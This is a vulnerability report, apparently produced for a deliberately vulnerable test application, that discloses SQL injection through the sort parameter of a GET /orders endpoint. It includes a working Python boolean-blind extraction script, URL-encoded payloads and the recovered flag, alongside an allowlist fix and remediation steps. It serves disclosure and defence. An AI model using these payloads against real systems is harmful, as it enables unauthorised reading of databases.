╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in GET /orders sort parameter (ORDER BY clause)        │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard                                           │
│                                                                              │
│  Endpoint: /orders                                                           │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The `sort` query parameter of `GET /orders` is interpolated directly into   │
│  the SQL `ORDER BY` clause with an f-string instead of being restricted to   │
│  a fixed set of column names. An unauthenticated attacker can inject         │
│  arbitrary SQL expressions, including sub-selects, turning the endpoint      │
│  into a blind SQL-injection oracle over the whole database. The hidden       │
│  `note` column — never part of this route's projected columns — and the      │
│  database schema were both extracted through it.                             │
│                                                                              │
│  Impact                                                                      │
│  Unauthenticated arbitrary read of the backing SQLite database. The          │
│  extraction PoC recovers the complete `note` column (including               │
│  `flag{orderby_ok}`) and `sqlite_master` schema through an endpoint whose    │
│  legitimate response only ever contains `id, sku, qty`. Any table readable   │
│  by the application's database user can be extracted the same way, one bit   │
│  per request.                                                                │
│                                                                              │
│  Technical Analysis                                                          │
│  The `orders()` view builds its SQL by string formatting:                    │
│                                                                              │
│  ```python title=app.py startLineNumber=25 endLineNumber=27                  │
│      sort = request.args.get("sort", "id")                                   │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│  ```                                                                         │
│                                                                              │
│  `request.args.get("sort", "id")` returns an arbitrary attacker-supplied     │
│  string, and the f-string places it verbatim where SQLite expects a column   │
│  reference or expression. Nothing constrains it to an identifier: no         │
│  allowlist, no identifier quoting, no character filtering.                   │
│                                                                              │
│  Because `ORDER BY` accepts any expression in SQLite, the payload *is* the   │
│  sort expression and does not need to break out of a string literal. Two     │
│  techniques demonstrate arbitrary read.                                      │
│                                                                              │
│  **Schema and projection discovery.** `sort=4` returns `HTTP 500` with `1st  │
│  ORDER BY term out of range - should be between 1 and 3`, confirming a       │
│  three-column projection and giving an error-based channel. A `UNION         │
│  SELECT` is not available at this position (SQLite raises `ORDER BY clause   │
│  should come after UNION not before`), so the proven channel is              │
│  expression-based.                                                           │
│                                                                              │
│  **Boolean blind extraction of the non-projected `note` column.** The        │
│  payload `(CASE WHEN (<predicate>) THEN id ELSE -id END)` is a legal `ORDER  │
│  BY` expression. When the predicate is TRUE the response is ordered          │
│  ascending by `id` (`1,2,3`); when FALSE it is ordered by `-id` (`3,2,1`).   │
│  This is a stable oracle visible in the JSON ordering, with no error         │
│  channel and no timing. Binary-searching `unicode(substr(note,i,1))`         │
│  recovers the whole column:                                                  │
│                                                                              │
│  ```                                                                         │
│  orders.id=1 note = 'flag{orderby_ok}'                                       │
│  orders.id=2 note = 'nothing'                                                │
│  orders.id=3 note = 'x'                                                      │
│  sqlite_version() = 3.53.4                                                   │
│  ```                                                                         │
│                                                                              │
│  The same oracle applied to `sqlite_master` flips the ordering in the TRUE   │
│  case and not in the FALSE case, confirming arbitrary schema access through  │
│  the same insertion point. Malformed input additionally produces a werkzeug  │
│  traceback exposing the source path; that is supporting evidence of the      │
│  interpolation, not the finding itself.                                      │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the application from a private working copy on a non-conflicting   │
│  port so the workspace directory is untouched.                               │
│  2. Send the benign baseline `GET /orders?sort=id` and record the three-row  │
│  response as the negative control.                                           │
│  3. Send `GET /orders?sort=4`. Observe `HTTP 500` and `1st ORDER BY term     │
│  out of range - should be between 1 and 3`, establishing the injection       │
│  point and the three-column projection.                                      │
│  4. Send the boolean-TRUE payload `GET /orders?sort=(CASE WHEN (SELECT       │
│  substr(note,1,5) FROM orders WHERE id=1)="flag{" THEN id ELSE -id END)`.    │
│  Observe rows ordered `1,2,3`.                                               │
│  5. Send the boolean-FALSE control with an identical payload shape but a     │
│  false predicate (`="zzzz!"`). Observe rows ordered `3,2,1`. The ordering    │
│  difference between steps 4 and 5 is the extraction oracle.                  │
│  6. Run the automated binary-search extractor to recover `note` for every    │
│  row plus `sqlite_version()`; results include `flag{orderby_ok}`.            │
│  7. Repeat the oracle against `sqlite_master` to confirm schema access from  │
│  the same injection point.                                                   │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://127.0.0.1:8107/orders"                                       │
│                                                                              │
│                                                                              │
│  def ask(predicate):                                                         │
│      """True -> rows sorted by id ascending (1,2,3); False -> by -id         │
│  (3,2,1)."""                                                                 │
│      payload = f"(CASE WHEN ({predicate}) THEN id ELSE -id END)"             │
│      rows = requests.get(BASE, params={"sort": payload}, timeout=10).json()  │
│      return [r[0] for r in rows] == [1, 2, 3]                                │
│                                                                              │
│                                                                              │
│  def extract(expr, maxlen=64):                                               │
│      out = ""                                                                │
│      for i in range(1, maxlen + 1):                                          │
│          lo, hi = 32, 126                                                    │
│          while lo < hi:                                                      │
│              mid = (lo + hi) // 2                                            │
│              if ask(f"unicode(substr(({expr}),{i},1))>{mid}"):               │
│                  lo = mid + 1                                                │
│              else:                                                           │
│                  hi = mid                                                    │
│          if lo < 32:                                                         │
│              break                                                           │
│          out += chr(lo)                                                      │
│          if not ask(f"length(({expr}))>={i + 1}"):                           │
│              break                                                           │
│      return out                                                              │
│                                                                              │
│                                                                              │
│  assert ask("1=1") is True and ask("1=2") is False   # oracle sanity check   │
│                                                                              │
│  for rid in (1, 2, 3):                                                       │
│      print(f"orders.id={rid} note = {extract(f'SELECT note FROM orders       │
│  WHERE id={rid}')!r}")                                                       │
│                                                                              │
│  print("sqlite_version() =", extract("SELECT sqlite_version()", 20))         │
│                                                                              │
│  schema = ask('(SELECT count(*) FROM sqlite_master WHERE type="table" AND    │
│  name="orders")=1')                                                          │
│  print("sqlite_master reachable:", schema)                                   │
│  ```                                                                         │
│                                                                              │
│  Equivalent single-shot requests:                                            │
│                                                                              │
│  ```                                                                         │
│  GET /orders?sort=id                                                         │
│  GET /orders?sort=4                                                          │
│  GET                                                                         │
│  /orders?sort=(CASE+WHEN+(SELECT+substr(note,1,5)+FROM+orders+WHERE+id%3D1)  │
│  %3D%22flag%7B%22+THEN+id+ELSE+-id+END)                                      │
│  GET                                                                         │
│  /orders?sort=(CASE+WHEN+(SELECT+substr(note,1,5)+FROM+orders+WHERE+id%3D1)  │
│  %3D%22zzzz%21%22+THEN+id+ELSE+-id+END)                                      │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:25-27                                                  │
│    Reject non-allowlisted sort keys and order by the fixed SQL fragment      │
│        sort = request.args.get("sort", "id")                                 │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    Fix:                                                                      │
│    -     sort = request.args.get("sort", "id")                               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    +     sort = request.args.get("sort", "id")                               │
│      if sort not in SORT_COLUMNS:                                            │
│          return jsonify({"error": "invalid sort column"}), 400               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {SORT_COLUMNS[sort]}").fetchall()                                           │
│                                                                              │
│    Location 2: app.py:12                                                     │
│    Add the sort-column allowlist constant                                    │
│    DB = "/tmp/test-vuln-hard/orders.db"                                      │
│    Fix:                                                                      │
│    - DB = "/tmp/test-vuln-hard/orders.db"                                    │
│    + DB = "/tmp/test-vuln-hard/orders.db"                                    │
│                                                                              │
│  SORT_COLUMNS = {"id": "id", "sku": "sku", "qty": "qty"}                     │
│                                                                              │
│  Remediation                                                                 │
│  1. Never build SQL syntax from request data. `ORDER BY` cannot be           │
│  parameterised on column names in SQLite, so map the user-supplied sort key  │
│  through a fixed allowlist dictionary to hard-coded SQL fragments and        │
│  reject anything not in the allowlist with a 400 before the query is built.  │
│  2. Keep the allowlist as a module-level constant next to the schema so      │
│  sortable columns are added deliberately rather than implicitly.             │
│  3. Where a value rather than an identifier is needed in a query, always     │
│  use `?` placeholders with tuple arguments, as in the companion fix for      │
│  `POST /orders/by-sku`.                                                      │
│  4. Add a regression test asserting that a non-allowlisted `sort` value      │
│  returns 400 and never reaches the database, and that every documented sort  │
│  key still returns correctly ordered rows.                                   │
